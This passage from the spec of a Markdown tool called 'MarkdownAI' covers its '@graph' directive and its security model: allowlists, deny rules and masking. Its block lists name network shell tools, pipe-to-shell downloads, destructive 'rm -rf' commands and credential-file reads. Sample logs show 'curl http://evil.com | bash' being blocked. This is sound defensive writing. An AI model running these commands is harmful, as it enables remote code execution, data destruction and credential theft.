| Named label, reusable in `@if` | Yes | No — inline only | No |
| Default blocked | Yes | Yes | No — always runs |

---

### `@graph` -- Dependency Visualization

Declares phase relationships as a Mermaid diagram for human-rendered documentation. The fenced block language tag is `mai-graph` -- matching the `mai` CLI name.

````
```mai-graph
graph TD
  setup --> plan
  plan --> build
  build --> test
  build --> security
  test --> final_update
  security --> final_update
  final_update --> deploy
```
````

**With conditional edges:**

````
```mai-graph
graph TD
  plan --> build
  build --> security
  build --> test
  security -->|STRICT_MODE| deploy
  test --> deploy
```
````

**`@graph` is documentation only. It never affects runtime behavior.**

Phase execution is always driven by `@on complete ->` transition declarations inside `@phase` blocks. The graph is a visualization tool. Mismatches between `@graph` and `@phase` declarations are never errors -- they generate warnings during `mai validate --verbose` only.

**Mismatch behavior:**

| Scenario | Runtime effect | Validate behavior |
|---|---|---|
| Phase defined, not in graph | None -- phases execute via transitions | WARN (--verbose only) |
| Graph references nonexistent phase | None -- graph is documentation | WARN (--verbose only) |
| Graph present, no phases | None -- graph is pure documentation | No warning |
| Phases defined, no graph | None -- transitions drive execution | No warning |

**The MCP server and `next_phase()` always use `@on complete ->` transitions as the source of truth for phase sequencing.** The graph is parsed for visualization only -- when it exists, the MCP server converts it to ASCII for AI context. When it doesn't exist, `list_phases()` derives the phase structure from transition declarations and presents that to the AI instead.

**`@graph` is also valid with no `@phase` declarations.** A team might use `mai-graph` to document their git branching strategy, deployment pipeline, or any directed graph -- not just MarkdownAI phases. The block is a general-purpose Mermaid diagram with dual-rendering support.

**Dual rendering rule:**

| Consumer | Rendering |
|---|---|
| Human (GitHub, VS Code, Notion) | Mermaid diagram |
| AI context (MCP server) | ASCII flow via `@render type="flow"` |
| Standard renderer without Mermaid | Plain code block |

The MCP server converts `mai-graph` blocks to ASCII automatically when serving to AI context. The same source file serves both audiences optimally.

**What the stripper does:** Passes through unchanged. The graph is documentation and belongs in stripped output.

---

## Security

### The Jail Model

MarkdownAI operates on the principle of **jail first**. Every dynamic, interpreted capability -- shell execution, database queries, HTTP requests -- is locked down by default. Nothing executes until the machine owner explicitly grants permission. A document author has zero ability to grant themselves capabilities on someone else's machine.

> A MarkdownAI document can only do what the machine it runs on has been configured to allow. The document controls what it asks for. The machine controls what it gets.

This means a malicious or compromised document is inert by default. No `@query` executes. No `@db` query fires. No `@http` request leaves the machine. The document renders as if those directives do not exist -- silently stripped with a warning logged.

**Dynamic directives are jailed by default:**

| Directive | Default | Requires |
|---|---|---|
| `@query` | Stripped | Shell config + allowlist match |
| `@db` | Stripped | DB config + operation allowlist match |
| `@http` | Stripped | HTTP config + domain allowlist match |

**Static directives have filesystem confinement and masking:**

| Directive | Confinement | Masking |
|---|---|---|
| `@include` | Document root only, no absolute paths | Built-in patterns always active |
| `@import` | Document root only, no absolute paths | Built-in patterns always active |
| `@read` | Document root only, no absolute paths | Built-in patterns always active |
| `@list` | Document root only, no absolute paths | N/A -- outputs filenames not content |

---

### The Security Config File

All security configuration lives in `~/.markdownai/security.json` -- in the user's home directory. Not in the project. Not in the document. Not overridable by anything a document author controls.

```bash
mai security init       # interactive setup wizard
mai security show       # display current config
mai security test       # test a command or query against config
mai security disable    # disable all dynamic execution
mai security audit      # review the audit log
```

**Default state -- everything jailed:**

```json
{
  "shell": {
    "enabled": false
  },
  "databases": {},
  "http": {
    "enabled": false
  }
}
```

Out of the box, all dynamic directives are stripped. The user explicitly builds their config using `mai security init` or by editing the file directly.

---

### Shell Execution -- `@query`

`@query` is the highest-risk directive. It executes arbitrary shell commands. It requires the most restrictive configuration.

**Config structure:**

```json
{
  "shell": {
    "enabled": true,
    "allowlist": [
      "git log *",
      "git status *",
      "git branch *",
      "npm audit *",
      "npm --version",
      "node --version",
      "wc *",
      "jq *"
    ],
    "deny_patterns": [
      "curl *",
      "wget *",
      "nc *",
      "ssh *",
      "sudo *",
      "rm *",
      "rmdir *",
      "chmod *",
      "chown *",
      "cat /etc/*",
      "cat ~/.ssh/*",
      "env *",
      "printenv *",
      "export *"
    ],
    "allow_network": false,
    "max_execution_time_ms": 30000,
    "require_confirmation": true,
    "audit_log": "~/.markdownai/shell-audit.log"
  }
}
```

**Execution pipeline for every `@query`:**

```
1. shell.enabled == true?           No  → strip silently, log warning
2. Command matches allowlist?       No  → strip, log warning
3. Command matches deny_patterns?   Yes → strip, log error
4. Command uses network tools?      Yes → check allow_network
   allow_network == false?          Yes → strip, log error
5. require_confirmation == true?    Yes → show command, prompt user
6. Execute with 30s timeout
7. Log to audit_log with timestamp, command, exit code
```

**require_confirmation behavior:**

When `require_confirmation` is true, execution pauses and displays every `@query` command from the entire document tree -- including all `@include` and `@import` dependencies -- before executing any:

```
⚠  SHELL EXECUTION REQUEST

The following commands will execute on your system:

  [input.md:34]   git log --oneline -1
  [input.md:67]   npm audit --json | jq '.vulnerabilities'
  [shared/status.md:12]  wc -l ./src/**/*.ts

Commands from IMPORTED files are marked above. Review carefully.

Type "yes" to execute all, "no" to skip all, or Ctrl+C to abort:
```

All commands are shown before any execute. The user cannot approve selectively -- it is all or nothing. If any command looks suspicious, abort.

**The allowlist is glob pattern matching:**

```
"git log *"    matches "git log --oneline -1", "git log --pretty=format:'%s'"
"wc *"         matches "wc -l", "wc -c ./file.txt"
"npm audit *"  matches "npm audit --json", "npm audit fix"
```

A command must match at least one allowlist pattern AND match zero deny_patterns to execute. Deny patterns take precedence over allowlist patterns.

**`allow_network` blocks network-capable commands:**

When `false` (default), any command invoking a known network tool is blocked regardless of the allowlist:

```
curl, wget, nc, netcat, ssh, ftp, sftp, rsync, scp,
telnet, nmap, dig, nslookup, host, ping
```

This prevents data exfiltration even if a network command somehow passes allowlist matching.

**Config management:**

```bash
mai security shell enable
mai security shell disable
mai security shell add "git log *"
mai security shell remove "curl *"
mai security shell test "git log --oneline -1"    # outputs: ALLOWED / BLOCKED
mai security shell list                            # show full allowlist
```

---

### Database Queries -- `@db`

`@db` executes queries against live databases. A document with write access to your database is as dangerous as shell access. The jail model applies equally.

**Config structure:**

```json
{
  "databases": {
    "primary": {
      "enabled": true,
      "readonly": true,
      "allowed_operations": {
        "mongodb": ["find", "aggregate", "countDocuments", "distinct"],
        "sql": ["SELECT"]
      },
      "denied_keywords": [
        "DROP", "DELETE", "UPDATE", "INSERT", "TRUNCATE",
        "ALTER", "CREATE", "REPLACE", "MERGE",
        "db.admin", "shutdown", "fsync", "dropDatabase",
        "deleteMany", "updateMany", "insertMany", "drop"
      ],
      "allowed_collections": [],
      "denied_collections": ["admin", "system", "config"],
      "max_results": 1000,
      "require_confirmation": false,
      "audit_log": "~/.markdownai/db-audit.log"
    }
  }
}
```

**Execution pipeline for every `@db`:**

```
1. Connection name in databases config?       No  → strip, log error
2. databases.name.enabled == true?            No  → strip silently
3. Parse query -- extract operation type
4. Operation in allowed_operations?           No  → strip, log error
5. Query contains denied_keywords?            Yes → strip, log error
6. Target collection in denied_collections?   Yes → strip, log error
7. allowed_collections non-empty?
   Collection NOT in allowed_collections?     Yes → strip, log error
8. readonly == true?                          Yes → enforce read-only credentials
9. Apply max_results to query automatically
10. Execute
11. Log to audit_log
```

**`readonly` is the most critical setting.**

When `readonly: true`, the engine enforces a read-only database user regardless of what the document requests. The connection string should reference a database user with only read permissions. Even if query sanitization is bypassed, the database user cannot write.

**Best practice -- always use dedicated read-only database users:**

```
# Wrong -- full admin credentials in env
MONGODB_URI=mongodb://admin:password@localhost/mydb

# Right -- read-only user, minimum permissions
MONGODB_URI=mongodb://readonly_user:password@localhost/mydb?readPreference=secondary
```

The spec recommends that `@connect` connections always use the minimum required database permissions. Documents should never have write access to production databases.

**`allowed_collections` -- whitelist specific collections:**

When non-empty, only listed collections can be queried:

```json
"allowed_collections": ["products", "categories", "public_stats"]
```

Any query targeting a collection not in this list is stripped. Leave empty to allow all non-denied collections.

**Query sanitization:**

Before execution, every query is parsed and checked:

- Multiple SQL statements separated by `;` → blocked
- SQL comment injection (`--`, `/**/`) → blocked
- MongoDB operator injection via user-controlled strings → sanitized
- Unbounded queries automatically capped to `max_results`

**Config management:**

```bash
mai security db add primary                        # add connection config
mai security db set primary.readonly true
mai security db allow-collection primary products
mai security db deny-keyword primary DROP
mai security db test primary "db.users.find()"     # ALLOWED / BLOCKED
mai security db disable primary
```

---

### HTTP Requests -- `@http`

`@http` makes outbound HTTP requests. A document that can make arbitrary requests can exfiltrate data, hit internal network services, or trigger actions on external APIs.

**Config structure:**

```json
{
  "http": {
    "enabled": true,
    "allowed_domains": [
      "api.github.com",
      "registry.npmjs.org",
      "api.npmjs.org"
    ],
    "denied_domains": [
      "169.254.169.254",
      "metadata.google.internal",
      "localhost",
      "127.0.0.1",
      "0.0.0.0",
      "10.*",
      "192.168.*",
      "172.16.*"
    ],
    "allowed_methods": ["GET"],
    "allow_internal_network": false,
    "max_response_size_kb": 512,
    "timeout_ms": 10000,
    "audit_log": "~/.markdownai/http-audit.log"
  }
}
```

**Execution pipeline for every `@http`:**

```
1. http.enabled == true?                 No  → strip silently
2. URL domain in allowed_domains?        No  → strip, log error
3. URL domain in denied_domains?         Yes → strip, log error
4. URL is internal/private IP?           Yes → check allow_internal_network
   allow_internal_network == false?      Yes → strip, log error
5. Method in allowed_methods?            No  → strip, log error
6. Execute with timeout
7. Response exceeds max_response_size?   Yes → truncate, log warning
8. Log to audit_log
```

**Internal network blocking is critical:**

The denied_domains list blocks cloud metadata endpoints by default (`169.254.169.254` is the AWS/GCP/Azure metadata service). A document that could reach the metadata service could steal cloud credentials. This is blocked regardless of other settings when `allow_internal_network` is false.

Private IP ranges (`10.*`, `192.168.*`, `172.16.*`) are blocked to prevent documents from probing internal network services.

**`allowed_methods: ["GET"]` by default:**

POST, PUT, DELETE, PATCH are all blocked unless explicitly added. Documents should only read data -- never trigger actions.

**Config management:**

```bash
mai security http enable
mai security http add-domain api.github.com
mai security http remove-domain api.github.com
mai security http test "https://api.github.com/repos/markdownai/core"  # ALLOWED / BLOCKED
mai security http disable
```

---

### Filesystem Security -- `@include` and `@import`

`@include` and `@import` are static directives -- they require no shell, no database, no network. But they are not safe by default. A document that can read arbitrary files from your filesystem can exfiltrate credentials just as effectively as `@query`.

```
@include ~/.ssh/id_rsa           ← private key rendered into document
@include ~/.aws/credentials      ← AWS credentials rendered into document
@include ../../.env.production   ← production secrets rendered into document
@include /etc/passwd             ← system file rendered into document
```

MarkdownAI applies two layers of filesystem protection: **confinement** (what files can be accessed) and **masking** (what content can be rendered).

---

**Layer 1 -- Document Root Confinement**

By default `@include` and `@import` can only resolve paths within the document root directory. The document root is the directory containing the root document, or `--cwd` if specified.

```
Document at: /projects/my-docs/index.md
Root:        /projects/my-docs/

ALLOWED:
  @include ./sections/intro.md           → /projects/my-docs/sections/intro.md  ✓
  @include ./shared/footer.md            → /projects/my-docs/shared/footer.md   ✓

BLOCKED -- traversal above root:
  @include ../other-project/config.md    → /projects/other-project/config.md    ✗
  @include ../../secrets.json            → /secrets.json                         ✗

BLOCKED -- absolute paths always:
  @include /etc/passwd                   → absolute path                         ✗
  @include ~/.ssh/id_rsa                 → home directory                        ✗
```

Absolute paths are always blocked. Traversal above the document root is always blocked. These two rules are immutable and cannot be overridden by any config.

**`--allow-traversal` for controlled cross-root access:**

```bash
mai build input.md --allow-traversal ../shared/
```

Explicitly permits traversal into one specific directory only. Not a blanket permission. Must be specified on every invocation -- cannot be set in config.

---

**Layer 2 -- Built-in Path and Filename Exclusions**

Even within the document root, certain paths and filename patterns are always blocked:

```json
{
  "filesystem": {
    "always_block_paths": [
      "~/.ssh/*",         "~/.aws/*",          "~/.gnupg/*",
      "~/.config/gcloud/*", "~/.kube/*",       "/etc/passwd",
      "/etc/shadow",      "/etc/sudoers",       "/proc/*",
      "/sys/*"
    ],
    "always_block_patterns": [
      "*.pem",    "*.key",    "*.p12",     "*.pfx",
      "*.jks",    "id_rsa",   "id_ed25519", "id_ecdsa",
      ".env*",    "*.env",    "*credentials*",
      "*secret*", "*password*", "*.token"
    ],
    "always_alert_patterns": [
      "*.json",   "config.yaml",  "config.yml",
      "settings.py", "settings.rb", "appsettings.*"
    ]
  }
}
```

`always_block_paths` -- absolute or home-relative paths. Always blocked regardless of document root.

`always_block_patterns` -- filename glob patterns. Matched against the filename only, not the full path. `*.key` blocks `/projects/my-docs/ssl/server.key` as well as any other `.key` file.

`always_alert_patterns` -- suspicious but potentially legitimate filenames. File is allowed but a `SECURITY_NOTICE` is always printed. JSON and YAML config files are valid document includes but worth flagging.

**User additional exclusions in `~/.markdownai/security.json`:**

```json
{
  "filesystem": {
    "confinement": true,
    "allow_traversal_paths": [],
    "additional_block_paths": [
      "/internal/secrets/*",
      "~/company-credentials/*"
    ],
    "additional_block_patterns": [
      "*.credentials",
      "internal-*.json",
      "production-*.yaml"
    ]
  }
}
```

---

**Layer 3 -- Content Masking**

The final safety net. Even if a file passes every path and exclusion check, its content is scanned for sensitive value patterns before being inlined into the document. Matching values are replaced with `***MASKED***`.

This means an accidentally included `.env` file renders safely:

```
# What .env contains:
DATABASE_URL=mongodb://admin:s3cr3t@prod.cluster.com/mydb
API_KEY=sk-1234567890abcdef1234567890abcdef
NODE_ENV=production
PORT=3000

# What gets rendered in the document:
DATABASE_URL=***MASKED***
API_KEY=***MASKED***
NODE_ENV=production
PORT=3000
```

Credentials are masked. Non-sensitive values pass through. The document renders. Nothing leaks.

**Built-in masking patterns:**

```json
{
  "masking": {
    "built_in_patterns": [
      { "name": "generic_key",        "regex": "(?i)(api_?key|access_?key|auth_?key)\\s*[=:]\\s*\\S+" },
      { "name": "generic_secret",     "regex": "(?i)(secret|password|passwd|pwd)\\s*[=:]\\s*\\S+" },
      { "name": "generic_token",      "regex": "(?i)(token|auth|bearer)\\s*[=:]\\s*\\S+" },
      { "name": "connection_string",  "regex": "(mongodb|postgres|mysql|redis|mssql):\\/\\/[^:]+:[^@]+@" },
      { "name": "aws_access_key",     "regex": "AKIA[0-9A-Z]{16}" },
      { "name": "aws_secret",         "regex": "(?i)aws_secret_access_key\\s*[=:]\\s*\\S+" },
      { "name": "github_token",       "regex": "ghp_[a-zA-Z0-9]{36}" },
      { "name": "stripe_key",         "regex": "sk_(live|test)_[a-zA-Z0-9]{24}" },
      { "name": "private_key_block",  "regex": "-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----" },
      { "name": "jwt_token",          "regex": "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" },
      { "name": "generic_env_value",  "regex": "^[A-Z][A-Z0-9_]+=.{8,}$" }
    ]
  }
}
```

The last pattern -- `generic_env_value` -- is the catch-all safety net. Any line matching `VARIABLE=longvalue` (8+ character value) is masked. This catches anything the specific patterns miss.

**`allow_unmasked_paths` -- trust an entire path:**

Files matching these glob patterns skip masking entirely. The machine owner is explicitly declaring these files safe to render as-is.

```json
{
  "filesystem": {
    "masking": {
      "allow_unmasked_paths": [
        "./docs/examples/**",
        "./config/public.*",
        "./.env.example",
        "./templates/**/*.md"
      ]
    }
  }
}
```

`./examples/**` -- all example files are documentation, safe by definition.
`.env.example` -- template file with placeholder values, not real credentials.

**`allow_unmasked_patterns` -- trust specific value patterns:**

Specific variable name patterns that are never sensitive regardless of which file they appear in.

```json
{
  "filesystem": {
    "masking": {
      "allow_unmasked_patterns": [
        "NODE_ENV=*",
        "PORT=*",
        "LOG_LEVEL=*",
        "APP_NAME=*",
        "TIMEZONE=*",
        "TZ=*"
      ]
    }
  }
}
```

`NODE_ENV=production` is not a credential. `PORT=3000` is not a credential. These are explicitly restored after masking.

**User additional masking patterns:**

```json
{
  "filesystem": {
    "masking": {
      "additional_patterns": [
        { "name": "internal_key", "regex": "INTERNAL_[A-Z_]+=\\S+" }
      ]
    }
  }
}
```

---

**The complete evaluation order for every `@include` and `@import`:**

```
1. Absolute path?                              YES → BLOCKED, always
2. Traversal above document root?              YES → BLOCKED, always
3. Path matches built-in always_block_paths?   YES → BLOCKED, SECURITY_ALERT, always printed
4. Filename matches built-in always_block_patterns? YES → BLOCKED, SECURITY_ALERT, always printed
5. Path matches user additional_block_paths?   YES → BLOCKED, WARN, verbose only
6. Filename matches user additional_block_patterns? YES → BLOCKED, WARN, verbose only
7. Filename matches always_alert_patterns?     YES → continue, SECURITY_NOTICE always printed
8. File readable?                              NO  → ERROR
9. Read file content
10. Path matches allow_unmasked_paths?         YES → skip to step 14
11. Apply built-in masking patterns            MASK matching values
12. Apply user additional masking patterns     MASK matching values
13. Restore allow_unmasked_patterns            RESTORE explicitly safe values
14. Inline content into document
15. Any masking occurred in step 11-12?        YES → SECURITY_NOTICE always printed
```

---

**`mai security filesystem` commands:**

```bash
mai security filesystem show

# Path exclusions
mai security filesystem add-block-path "~/company-secrets/*"
mai security filesystem add-block-pattern "*.credentials"
mai security filesystem remove-block-pattern "*.credentials"
mai security filesystem list-blocked

# Masking
mai security filesystem allow-path "./examples/**"
mai security filesystem allow-path "./.env.example"
mai security filesystem disallow-path "./examples/**"
mai security filesystem allow-pattern "NODE_ENV=*"
mai security filesystem disallow-pattern "NODE_ENV=*"
mai security filesystem add-mask-pattern "INTERNAL_[A-Z_]+=\\S+"
mai security filesystem list-allowed

# Testing
mai security filesystem test ./path/to/file.md    # ALLOWED / BLOCKED + reason
mai security filesystem test-mask ./.env          # preview masking output
```

**`test-mask` output:**

```bash
mai security filesystem test-mask ./.env

Testing masking for: ./.env

  Line 1: DATABASE_URL=mongodb://...  → ***MASKED*** (connection_string)
  Line 2: API_KEY=sk-abc123           → ***MASKED*** (generic_key)
  Line 3: NODE_ENV=production         → NODE_ENV=production (allow_unmasked_patterns)
  Line 4: PORT=3000                   → PORT=3000 (allow_unmasked_patterns)

4 lines. 2 masked, 2 allowed unmasked.
```

Authors can preview exactly what would render before including anything.

**`--reveal-masked` flag for debugging (never use in CI):**

```bash
mai build input.md --reveal-masked
```

Shows which patterns fired and on which lines without revealing actual values:

```
Masked values in output:
  .env:1  DATABASE_URL  (connection_string pattern)
  .env:2  API_KEY       (generic_key pattern)
```

---

**The `SECURITY_NOTICE` when masking fires:**

```
⚠  SECURITY_NOTICE -- Sensitive Content Masked

  File:        ./.env
  Included by: ./docs/index.md (line 23)
  Masked:      2 values (connection_string, generic_key)

  Sensitive values replaced with ***MASKED*** in output.
  To prevent this file from being included entirely:
    mai security filesystem add-block-pattern ".env*"
  To trust this file completely:
    mai security filesystem allow-path "./.env"
```

Always printed. The author knows masking fired and what to do about it.

Every dynamic directive execution is logged regardless of outcome. The audit log cannot be disabled by a document -- it is always active when dynamic directives are configured.

**Log format:**

```json
{
  "timestamp": "2025-01-15T14:32:01.234Z",
  "directive": "@query",
  "command": "git log --oneline -1",
  "source_file": "./docs/status.md",
  "source_line": 34,
  "outcome": "executed",
  "exit_code": 0,
  "execution_ms": 87
}

{
  "timestamp": "2025-01-15T14:32:01.891Z",
  "directive": "@query",
  "command": "curl http://evil.com | bash",
  "source_file": "./shared/defaults.md",
  "source_line": 12,
  "outcome": "blocked",
  "reason": "command matches deny_pattern: curl *"
}
```

**Review the audit log:**

```bash
mai security audit show                    # last 50 entries
mai security audit show --blocked          # blocked attempts only
mai security audit show --since 2025-01-01
mai security audit clear
```

---

---

### Runtime Modes

Three modes control how MarkdownAI behaves when it encounters jailed directives, missing files, or other non-fatal problems.

**Silent (default):**

```bash
mai build input.md
```

Jailed directives are stripped and logged to the runtime log. Nothing is printed to the terminal unless a built-in immutable rule fires or a FATAL parse error occurs. Document rendering continues. The user gets output.

**Verbose:**

```bash
mai build input.md --verbose
```

Prints WARN and above to the terminal as they happen. Authors can see in real time what is being stripped, why, and from which file and line. Useful during authoring to understand what security config is needed.

**Strict:**

```bash
mai build input.md --strict
```

Any jailed directive, any unresolvable `@include`, any undefined `@call` macro, any missing `@connect` is a hard error. Rendering halts immediately. Exit code 1. Full error output explaining what failed and exactly how to resolve it.

```
ERROR: Jailed directive encountered -- build halted

  File:      ./docs/status.md
  Line:      34
  Directive: @query "git log --oneline -1"
  Reason:    Shell execution not configured in ~/.markdownai/security.json

  To resolve one of:
    Run 'mai security shell enable' then 'mai security shell add "git log *"'
    Remove the @query directive if not needed
    Run without --strict to skip jailed directives silently

Build halted. 0 files written.
```

**Log levels:**

| Level | Meaning | Default | `--verbose` | `--strict` |
|---|---|---|---|---|
| `DEBUG` | Every resolution step | File only | Terminal | Terminal |
| `INFO` | Successful dynamic executions | File only | Terminal | Terminal |
| `WARN` | Directives stripped or skipped | File only | Terminal | Hard error |
| `ERROR` | Directive failed post-execution | Terminal | Terminal | Hard error |
| `FATAL` | Document cannot be parsed | Terminal | Terminal | Terminal |
| `SECURITY_ALERT` | Built-in rule matched | Terminal always | Terminal | Terminal |

`FATAL` and `SECURITY_ALERT` always print to the terminal regardless of mode. They cannot be silenced.

**The runtime log:**

All events at WARN and above are written to `~/.markdownai/runtime.log`. Separate from the security audit log.

```json
{
  "timestamp": "2025-01-15T14:32:01.234Z",
  "level": "WARN",
  "event": "directive_stripped",
  "directive": "@query",
  "command": "git log --oneline -1",
  "source_file": "./docs/status.md",
  "source_line": 34,
  "reason": "shell.enabled is false in security config"
}
```

**CI integration:**

```bash
# Recommended CI pattern
mai validate ./docs/ --strict && mai build ./docs/ -o ./dist/
```

`mai validate --strict` catches every problem before building. If it passes, `mai build` will too.

---

### Built-in Immutable Rules

MarkdownAI ships with a built-in ruleset of patterns that are always blocked or always flagged. These rules cannot be disabled by any user config, project config, or CLI flag. They are the security floor.

**Two built-in tiers:**

**`always_block`** -- Pattern is always blocked. Always logged as `SECURITY_ALERT`. Always printed to terminal regardless of verbose mode. No user config can permit these.

**`always_alert`** -- Pattern is suspicious but potentially legitimate. Blocked unless explicitly in the user's allowlist. If in the user's allowlist, always printed as a `SECURITY_NOTICE` regardless of verbose mode. The user chose to allow it but is always reminded when it runs.

**Built-in shell rules:**

```json
{
  "shell": {
    "always_block": [
      "rm -rf *",        "rm -rf /",         "rm -rf ~",
      "rm -rf .*",       ":(){:|:&};:",       "dd if=* of=/dev/*",
      "mkfs *",          "format *",          "> /etc/*",
      "chmod -R 777 *",  "chmod 777 /",       "chown -R * /",
      "wget * | bash",   "wget * | sh",       "curl * | bash",
      "curl * | sh",     "curl * | python*",  "curl * | ruby*",
      "curl * | perl*",  "bash <(*)",         "sh <(*)",
      "eval *",          "exec *",
      "cat /etc/shadow", "cat /etc/passwd",
      "cat ~/.ssh/*",    "cat ~/.aws/*",      "cat ~/.gnupg/*",
      "env | *",         "printenv | *",      "export * | *",
      "history | *",     "sudo rm *",         "sudo dd *",
      "sudo mkfs *",     "sudo bash *",       "sudo sh *",
      "sudo chmod *",    "sudo chown *",
      "python* -c *",    "ruby* -e *",        "perl* -e *",
      "node* -e *",      "php* -r *"
    ],
    "always_alert": [
      "sudo *",    "su *",      "passwd *",
      "useradd *", "userdel *", "groupadd *",
      "crontab *", "at *",      "nohup *",
      "screen *",  "tmux *",    "nc *",
      "netcat *",  "nmap *",    "tcpdump *",
      "ssh *",     "scp *",     "sftp *",
      "rsync *",   "base64 *",  "xxd *", "od *"
    ]
  }
}
```

**Built-in database rules:**

```json
{
  "db": {
    "always_block": [
      "DROP *",           "DROP DATABASE *",     "DROP TABLE *",
      "TRUNCATE *",       "DELETE FROM *",        "UPDATE * SET *",
      "ALTER TABLE *",    "CREATE USER *",        "GRANT *",
      "REVOKE *",         "db.dropDatabase()",    "db.*.drop()",
      "db.*.deleteMany()", "db.*.remove()",       "db.*.updateMany()",
      "db.*.insertMany()", "db.admin()*",
      "db.runCommand({shutdown*",
      "db.runCommand({fsync*"
    ]
  }
}
```

**Built-in HTTP rules:**

```json
{
  "http": {
    "always_block_domains": [
      "169.254.169.254",
      "metadata.google.internal",
      "metadata.internal",
      "169.254.*",
      "fd00:ec2::254"
    ]
  }
}
```

Cloud metadata endpoints are always blocked. A document that could reach the AWS/GCP/Azure metadata service could steal cloud credentials. This is non-negotiable.

**Built-in filesystem rules:**

```json
{
  "filesystem": {
    "always_block_paths": [
      "~/.ssh/*",          "~/.aws/*",           "~/.gnupg/*",
      "~/.config/gcloud/*", "~/.kube/*",          "/etc/passwd",
      "/etc/shadow",       "/etc/sudoers",        "/proc/*",
      "/sys/*"
    ],
    "always_block_patterns": [
      "*.pem",    "*.key",     "*.p12",      "*.pfx",
      "*.jks",    "id_rsa",    "id_ed25519", "id_ecdsa",
      ".env*",    "*.env",     "*credentials*",
      "*secret*", "*password*", "*.token"
    ],
    "always_alert_patterns": [
      "*.json",      "config.yaml",    "config.yml",
      "settings.py", "settings.rb",   "appsettings.*"
    ],
    "masking": {
      "built_in_patterns": [
        { "name": "generic_key",       "regex": "(?i)(api_?key|access_?key|auth_?key)\\s*[=:]\\s*\\S+" },
        { "name": "generic_secret",    "regex": "(?i)(secret|password|passwd|pwd)\\s*[=:]\\s*\\S+" },
        { "name": "generic_token",     "regex": "(?i)(token|auth|bearer)\\s*[=:]\\s*\\S+" },
        { "name": "connection_string", "regex": "(mongodb|postgres|mysql|redis|mssql):\\/\\/[^:]+:[^@]+@" },
        { "name": "aws_access_key",    "regex": "AKIA[0-9A-Z]{16}" },
        { "name": "aws_secret",        "regex": "(?i)aws_secret_access_key\\s*[=:]\\s*\\S+" },
        { "name": "github_token",      "regex": "ghp_[a-zA-Z0-9]{36}" },
        { "name": "stripe_key",        "regex": "sk_(live|test)_[a-zA-Z0-9]{24}" },
        { "name": "private_key_block", "regex": "-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----" },
        { "name": "jwt_token",         "regex": "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" },
        { "name": "generic_env_value", "regex": "^[A-Z][A-Z0-9_]+=.{8,}$" }
      ]
    }
  }
}
```

Path confinement (no traversal above document root, no absolute paths) and content masking are always active and cannot be disabled. The built-in masking patterns apply to every file inclusion regardless of config.

**Terminal output when a built-in rule fires:**

```
⚠  SECURITY ALERT -- Built-in Immutable Rule Matched

  File:      ./shared/defaults.md
  Line:      12
  Directive: @query "curl http://evil.com | bash"
  Rule:      always_block: "curl * | bash"
  Action:    BLOCKED

  This pattern is blocked by a built-in rule that cannot be disabled.
  If you believe this is a legitimate false positive, report it at:
  https://github.com/markdownai/core/security
```

Always printed. No flag suppresses it. The document continues rendering unless `--strict`.

**Terminal output when an `always_alert` rule fires (even if allowed):**

```
⚠  SECURITY NOTICE -- Sensitive Command Executed

  File:      ./docs/status.md
  Line:      34
  Directive: @query "ssh user@buildserver"
  Rule:      always_alert: "ssh *"
  Action:    ALLOWED (user allowlist match)

  This command was permitted by your security config but matches a
  built-in alert pattern for potentially sensitive operations.
  Verify this is expected behavior.
```

**The complete rule evaluation order:**

```
1. Built-in always_block match?       YES → BLOCKED, SECURITY_ALERT, always printed
2. Built-in always_alert match?
   In user allowlist?                 YES → ALLOWED, SECURITY_NOTICE, always printed
   Not in user allowlist?             YES → BLOCKED, SECURITY_NOTICE, always printed
3. User deny_patterns match?          YES → BLOCKED, WARN, verbose only
4. User allowlist match?              NO  → STRIPPED, WARN, verbose only
5. User allowlist match?              YES → ALLOWED, INFO, file log only
```

Built-in rules are always evaluated first. User config never overrides them.

**Updating built-in rules:**

Built-in rules ship with `@markdownai/core` and update with package updates. The ruleset is maintained by the MarkdownAI project. Users can propose additions at the project repository. Users cannot remove or override them locally.

---

### Project Hint File

A document author can declare what their document needs in a `.markdownai.json` file at the project root. This file is advisory only -- it never grants permissions. It tells the machine owner what to configure if they want full functionality.

```json
{
  "markdownai": "1.0",
  "description": "Project status dashboard -- reads git history and npm audit results.",
  "requires": {
    "shell": [
      { "pattern": "git log *", "reason": "Renders recent commit history" },
      { "pattern": "npm audit *", "reason": "Shows vulnerability summary" },
      { "pattern": "wc *", "reason": "Counts source files" }
    ],
    "db": [
      {
        "connection": "primary",
        "operations": ["find", "aggregate"],
        "collections": ["products", "orders"],
        "reason": "Renders live inventory and order counts"
      }
    ],
    "http": [
      { "domain": "api.github.com", "reason": "Shows GitHub star count" }
    ],
    "filesystem": [
      {
        "allow_unmasked_paths": ["./config/public.*"],
        "reason": "Public config values needed unmasked in output"
      }
    ]
  }
}
```

**When a document has a hint file and the user's security config does not cover its requirements:**

```
INFO: This document declares requirements not covered by your security config:

  Shell patterns needed:
    "git log *"   -- Renders recent commit history
    "npm audit *" -- Shows vulnerability summary

  These directives will be stripped silently.

  To enable them:
    mai security shell add "git log *"
    mai security shell add "npm audit *"

  Or run with --verbose to see all stripped directives.
  Or run with --strict to halt on any stripped directive.
```

The user sees exactly what to add and why. They decide. The document never grants itself anything.

**`mai security init --from .markdownai.json`**

Reads the hint file and walks the user through approving each requirement interactively:

```
This document needs shell access to:

  "git log *"  -- Renders recent commit history
  Allow? [y/N]: y

  "npm audit *" -- Shows vulnerability summary
  Allow? [y/N]: y

  "wc *" -- Counts source files
  Allow? [y/N]: n

Config updated. 2 patterns added, 1 skipped.
```

---

### Security Principles Summary

**1. Jail first.** All dynamic directives are stripped by default. Nothing executes without explicit machine-owner configuration.

**2. Machine owner controls execution.** The security config lives in `~/.markdownai/security.json`. No document, no project config, no CLI flag overrides it.

**3. Built-in rules are the floor.** Obvious attack patterns are always blocked regardless of any configuration. The floor cannot be lowered.

**4. Static directives are confined and masked.** `@include`, `@import`, and `@read` are confined to the document root. Absolute paths and traversal are always blocked. Content is always scanned for sensitive patterns and masked before rendering. These protections cannot be disabled.

**5. Allowlist over blocklist.** You define what is permitted. Everything else is denied. Built-in deny patterns are additional safety -- the allowlist is the primary gate.

**6. Least privilege.** Database connections should use read-only users. HTTP requests default to GET only. Shell commands should be the minimum needed. `allow_unmasked_paths` should be the minimum set of trusted paths.

